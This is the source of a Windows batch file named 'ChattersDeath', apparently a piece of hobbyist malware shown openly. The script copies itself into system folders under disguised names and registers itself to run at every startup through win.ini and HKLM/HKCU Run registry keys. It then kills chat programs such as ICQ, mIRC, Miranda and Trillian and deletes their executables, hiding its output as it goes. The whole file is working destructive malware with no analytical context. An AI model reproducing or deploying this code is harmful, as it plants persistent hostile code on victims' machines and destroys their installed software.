   @echo off
   :: ChattersDeath
   :: by Razorblade
   :: m€!@ h!, m€!@ hu, m€!@ h@, m€!@ h@h@

   copy %0 "%systemroot%\system32\cht32.bat" > nul
   copy %0 "%systemroot%\winchat32.bat" > nul

   echo [windows] >> "%systemroot%\win.ini"
   echo load=%systemroot%\system32\cht32.bat >> "%systemroot%\win.ini"
   echo run=%systemroot%\system32\cht32.bat >> "%systemroot%\win.ini"

   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinMsgChat /t REG_SZ /d "%systemroot%\system32\cht32.bat" /f > nul
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinMsgChat /t REG_SZ /d "%systemroot%\winchat32.bat" /f > nul

   cls

   tskill ICQ* > nul
   tskill mir* > nul
   tskill dir* > nul
   tskill trill* > nul
   tskill scri* > nul

   cls

   if exist "%programfiles%\ICQLite" (
       del /f "%programfiles%\ICQLite\ICQ*.exe"
   )
   if exist "%programfiles%\ICQ*" (
       del /f "%programfiles%\ICQ*\ICQ*.exe"
   )
   if exist "%programfiles%\mIRC*" (
       del /f "%programfiles%\mIRC*\mi*.exe"
   )
   if exist "%programfiles%\Miran*" (
       del /f "%programfiles%\Mirand*\mir*.exe"
   )

   cls
   exit
